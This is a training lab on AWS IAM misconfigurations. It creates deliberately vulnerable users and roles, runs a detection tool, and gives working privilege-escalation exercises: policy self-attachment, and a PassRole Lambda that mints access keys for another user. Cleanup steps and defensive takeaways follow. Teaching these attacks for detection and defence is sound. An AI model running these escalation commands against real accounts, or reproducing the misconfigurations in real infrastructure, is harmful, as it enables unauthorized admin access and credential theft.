# Lab 1: Setting Up a Vulnerable IAM Environment

## 🎯 Learning Objectives

By the end of this lab, you will:
- Understand how to identify vulnerable IAM configurations
- Create intentionally misconfigured IAM resources
- Recognize privilege escalation paths
- Learn the impact of overly permissive policies

## ⚠️ WARNING

This lab creates intentionally vulnerable resources. **NEVER** do this in a production AWS account.

### Prerequisites
- AWS account (use a sandbox/learning account)
- AWS CLI configured
- Admin permissions (to create IAM resources)
- Python 3.8+ with boto3 installed

## 📝 Lab Setup

### Step 1: Create Vulnerable User

Create a user with privilege escalation opportunities:

```bash
# Create the user
aws iam create-user --user-name vulnerable-dev-user

# Create and attach vulnerable policy
aws iam put-user-policy \
  --user-name vulnerable-dev-user \
  --policy-name PrivEscPolicy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": [
          "iam:CreatePolicy",
          "iam:AttachUserPolicy"
        ],
        "Resource": "*"
      }
    ]
  }'

# Create access key for testing
aws iam create-access-key --user-name vulnerable-dev-user
```

**Save the credentials!** You'll use them to test exploitation.

### Step 2: Create Over-Privileged Role

```bash
# Create trust policy file
cat > trust-policy.json << EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "lambda.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF

# Create the role
aws iam create-role \
  --role-name OverPrivilegedLambdaRole \
  --assume-role-policy-document file://trust-policy.json

# Attach admin policy (DANGEROUS!)
aws iam attach-role-policy \
  --role-name OverPrivilegedLambdaRole \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### Step 3: Create User with PassRole Vulnerability

```bash
# Create developer user
aws iam create-user --user-name dev-with-passrole

# Attach policy allowing PassRole + Lambda operations
aws iam put-user-policy \
  --user-name dev-with-passrole \
  --policy-name PassRoleVulnerability \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": [
          "iam:PassRole",
          "lambda:CreateFunction",
          "lambda:InvokeFunction"
        ],
        "Resource": "*"
      }
    ]
  }'

# Create credentials
aws iam create-access-key --user-name dev-with-passrole
```

### Step 4: Create Overly Permissive S3 Policy

```bash
# Create a test bucket
aws s3 mb s3://vulnerable-test-bucket-$(date +%s)

# Create user with wildcard S3 permissions
aws iam create-user --user-name s3-wildcard-user

aws iam put-user-policy \
  --user-name s3-wildcard-user \
  --policy-name WildcardS3Policy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": "s3:*",
        "Resource": "*"
      }
    ]
  }'
```

### Step 5: Create User Without MFA

```bash
# Create user with console access but no MFA
aws iam create-user --user-name no-mfa-user

# Create login profile
aws iam create-login-profile \
  --user-name no-mfa-user \
  --password "TempPassword123!" \
  --password-reset-required

# Attach PowerUser policy
aws iam attach-user-policy \
  --user-name no-mfa-user \
  --policy-arn arn:aws:iam::aws:policy/PowerUserAccess
```

### Step 6: Create Old Unused Credentials

```bash
# Create user with credentials that won't be used
aws iam create-user --user-name unused-credential-user

# Create access key (but never use it)
aws iam create-access-key --user-name unused-credential-user
```

## 🔍 Vulnerability Summary

You've now created:

| Vulnerability | User/Role | Risk Level |
|--------------|-----------|------------|
| Policy creation + attachment | vulnerable-dev-user | CRITICAL |
| PassRole with Lambda | dev-with-passrole | CRITICAL |
| Over-privileged role | OverPrivilegedLambdaRole | HIGH |
| Wildcard S3 permissions | s3-wildcard-user | MEDIUM |
| No MFA on privileged account | no-mfa-user | HIGH |
| Unused credentials | unused-credential-user | MEDIUM |

## 🧪 Testing Detection

Now run the IAM analyzer to detect these vulnerabilities:

```bash
python3 iam_analyzer.py --output lab1-results.json
```

### Expected Findings

The analyzer should detect:

1. **Privilege Escalation Paths**: 
   - `vulnerable-dev-user` has create_policy_attach path
   - `dev-with-passrole` has pass_role_lambda path

2. **Overly Permissive Policies**:
   - `s3-wildcard-user` has wildcard permissions
   - `OverPrivilegedLambdaRole` has admin access

3. **MFA Issues**:
   - `no-mfa-user` has console access without MFA

4. **Unused Credentials**:
   - `unused-credential-user` has never-used credentials

## 💥 Exploitation Exercise

### Exercise 1: Privilege Escalation via Policy Creation

Using the `vulnerable-dev-user` credentials:

```bash
# Configure AWS CLI with vulnerable user credentials
export AWS_ACCESS_KEY_ID=<vulnerable-user-key>
export AWS_SECRET_ACCESS_KEY=<vulnerable-user-secret>

# Create an admin policy
aws iam create-policy \
  --policy-name EscalatedAdminPolicy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }]
  }'

# Get the policy ARN from output, then attach it
aws iam attach-user-policy \
  --user-name vulnerable-dev-user \
  --policy-arn arn:aws:iam::ACCOUNT_ID:policy/EscalatedAdminPolicy

# Verify escalation - you now have admin access!
aws iam list-users
```

### Exercise 2: PassRole Exploitation

Using the `dev-with-passrole` credentials:

```bash
# Switch to dev-with-passrole credentials
export AWS_ACCESS_KEY_ID=<passrole-user-key>
export AWS_SECRET_ACCESS_KEY=<passrole-user-secret>

# Create malicious Lambda function code
cat > lambda_function.py << 'EOF'
import boto3

def lambda_handler(event, context):
    # This Lambda has admin role - can do anything!
    iam = boto3.client('iam')
    
    # Create access key for any user
    response = iam.create_access_key(UserName='target-admin-user')
    
    return {
        'statusCode': 200,
        'body': 'Privilege escalation successful!'
    }
EOF

# Package it
zip function.zip lambda_function.py

# Create Lambda with privileged role
aws lambda create-function \
  --function-name exploit-function \
  --runtime python3.11 \
  --role arn:aws:iam::ACCOUNT_ID:role/OverPrivilegedLambdaRole \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://function.zip

# Invoke it to escalate
aws lambda invoke \
  --function-name exploit-function \
  response.json

cat response.json
```

## 🧹 Cleanup

**IMPORTANT**: Clean up all vulnerable resources after the lab:

```bash
# Delete users
aws iam delete-access-key --user-name vulnerable-dev-user --access-key-id <KEY_ID>
aws iam delete-user-policy --user-name vulnerable-dev-user --policy-name PrivEscPolicy
aws iam delete-user --user-name vulnerable-dev-user

aws iam delete-access-key --user-name dev-with-passrole --access-key-id <KEY_ID>
aws iam delete-user-policy --user-name dev-with-passrole --policy-name PassRoleVulnerability
aws iam delete-user --user-name dev-with-passrole

aws iam delete-user-policy --user-name s3-wildcard-user --policy-name WildcardS3Policy
aws iam delete-user --user-name s3-wildcard-user

aws iam detach-user-policy --user-name no-mfa-user --policy-arn arn:aws:iam::aws:policy/PowerUserAccess
aws iam delete-login-profile --user-name no-mfa-user
aws iam delete-user --user-name no-mfa-user

aws iam delete-access-key --user-name unused-credential-user --access-key-id <KEY_ID>
aws iam delete-user --user-name unused-credential-user

# Delete role
aws iam detach-role-policy --role-name OverPrivilegedLambdaRole --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam delete-role --role-name OverPrivilegedLambdaRole

# Delete Lambda
aws lambda delete-function --function-name exploit-function

# Delete created policies
aws iam delete-policy --policy-arn arn:aws:iam::ACCOUNT_ID:policy/EscalatedAdminPolicy

# Delete S3 bucket
aws s3 rb s3://vulnerable-test-bucket-<timestamp> --force
```

## 📚 Key Takeaways

1. **Never combine dangerous permissions**: `iam:CreatePolicy` + `iam:AttachUserPolicy` is a critical escalation path

2. **PassRole is powerful**: Combined with service execution (Lambda, EC2, etc.), it can escalate privileges

3. **Wildcards are dangerous**: `Action: *` or `Resource: *` should be avoided

4. **MFA is essential**: Privileged accounts without MFA are easily compromised

5. **Audit regularly**: Unused credentials should be rotated or deleted

## 🎓 Next Steps

Proceed to **Lab 2: Detecting Vulnerabilities** where you'll:
- Learn to use AWS Access Analyzer
- Set up CloudWatch alarms for IAM changes
- Create automated detection pipelines

---

**Remember**: These vulnerabilities are for learning purposes only. Never create them in production!